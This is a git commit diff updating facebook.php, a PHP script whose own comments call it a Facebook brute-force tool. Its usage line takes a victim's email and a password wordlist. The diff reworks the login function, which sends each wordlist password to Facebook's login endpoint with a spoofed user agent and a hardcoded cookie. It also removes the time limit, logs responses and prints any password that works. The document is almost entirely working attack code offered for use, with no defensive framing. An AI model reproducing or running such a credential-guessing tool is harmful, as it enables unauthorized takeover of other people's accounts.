c28b1b0b2e586a068db335265cc956f4c8e576a5
Pablo Santhus <santhuspablo@gmail.com>
2016-08-25 11:47:37 -0300

    Update facebook.php

--- facebook.php
+++ facebook.php
@@ -1,13 +1,16 @@
 <?php
-
-/*
-  Tool hacker
-  By Pablo Santhus
-  09/08/2016
-*/
-
+	/*
+		Criado Por Pablo Santhus
+		Facebook Brute Force PHP
+		facebook.php v 1.0
+		
+		Ajuda: php facebook.php emaildavitima@hotmail.com wordlist.txt
+		
+		obs: após algumas tentativas o facebook irá bloqueia o acesso
+		a conta por algumas horas.
+	*/
 	error_reporting(0);
-	set_time_limit(100);
+	set_time_limit(0);
 	print menu();
 
 	$email = $argv[1];
@@ -26,31 +29,32 @@ echo"|  _// _` || '_ \| |/ _ \ \__ \/ _` || ' \))|  _|| ' \ | || |(_-< 	 \n";
 echo"|_|  \__,_||_.__/|_|\___/ |___/\__,_||_||_|  \__||_||_| \_,_|/__/	 \n";
 print"\n";
 echo "Facebook Brute \n";
-echo "Coded By Pablo Santhus \n";
-echo "exemplo: php facebook.php seuemail@gmail.com wordlist.txt \n";
+echo "Criado por Pablo Santhus \n";
+echo "exemplo: php facebook.php seuemail@gmail.com wordlist.txt 	  \n";
 print "\n";
-print"--------------------------------------------------------------------\n";
+print"--------------------------------------------------------------------\n\n";
 }
 
 	function brute($usuario, $senha){
-		$ch = curl_init('https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php');
-		curl_setopt($ch, CURLOPT_HEADER, 0);
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
+		curl_setopt($ch, CURLOPT_HEADER, 1);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_POST, 1);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha&login=Login");
+		curl_setopt($ch, CURLOPT_POST, true);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
 		curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.21 (Windows NT 5.1; U; tr)");
-		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt");
+		curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
+		curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
 		curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
 		$source = curl_exec($ch);
-		curl_close($ch);
-		if(eregi("Home</title>", $source)){
+		$fp = fopen("log.html", "w");
+		fwrite($fp, $source);
+		if(eregi("https://m.facebook.com/home.php", $source)){
 			return true;
-
 		}else{
 			return false;
-
 		}
 	}
 
@@ -60,24 +64,23 @@ print"--------------------------------------------------------------------\n";
 		exit;
 	}
 
+if(isset($argv[1]) && isset($argv[2])){
 	$lines = file($dicionario);
 	foreach($lines as $line){
 		$line = str_replace("\r", "", $line);
 		$line = str_replace("\n", "", $line);
 		if(brute($email, $line)){
-			print "\n";
 			print"--------------------------------------------------------------------\n";
 			print "\n";
-			print "	[+] Email: ".$email. " Senha: ".$line. 		   "\n";
+			print "	[+] Email: ".$email. " Senha: ".$line.  "\n";
 			print "\n";
 			print"--------------------------------------------------------------------\n";
-			$fp = fopen('cookies.txt', 'w');
-			fwrite($fp, '');
 			exit;
 		}else{
-			print "[-] Email: ".$email. " Senha Incorreta: ".$line. "\n";
+			print "[-] Email: ".$email. " Senha Incorreta: ".$line."\n";
 		}
 	}
+}
 	
 
 ?>
